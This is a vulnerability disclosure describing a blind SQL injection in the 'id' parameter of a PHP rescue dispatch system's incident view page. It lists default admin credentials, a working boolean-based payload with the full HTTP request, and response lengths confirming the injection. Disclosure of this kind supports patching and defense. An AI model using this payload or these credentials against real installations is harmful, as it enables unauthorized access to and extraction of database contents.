# Rescue Dispatch Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15296/rescue-dispatch-management-system-phpoop-free-source-code.html

Vulnerability File:  /rdms/admin/incidents/view_incident.php?id=

Vulnerability location: /rdms/admin/incidents/view_incident.php?id=,id

[+] Payload: /rdms/admin/incidents/view_incident.php?id=4%27%20and%20length(database())%20=7--+ // Leak place ---> id

Current database name: rdms_db,length is 7

```sql
GET /rdms/admin/incidents/view_incident.php?id=4%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=hkbchcmaitn0d8enhm4jtdjk9q
Connection: close
```

When length (database ()) = 6, Content-Length: 860
![image](https://user-images.githubusercontent.com/54017627/170462424-d3e4f5e1-f351-4324-bce5-e4d5a0d3818c.png)

![image](https://user-images.githubusercontent.com/54017627/170462234-944c285c-c356-4685-a8fe-c6e6a3282fc1.png)

When length (database ()) = 7, Content-Length: 749
![image](https://user-images.githubusercontent.com/54017627/170462393-dc96e199-f0b5-4a3f-ab46-b8f67853bea1.png)

![image](https://user-images.githubusercontent.com/54017627/170462156-e69db736-7110-4ca0-977a-b29b9bd63bb8.png)
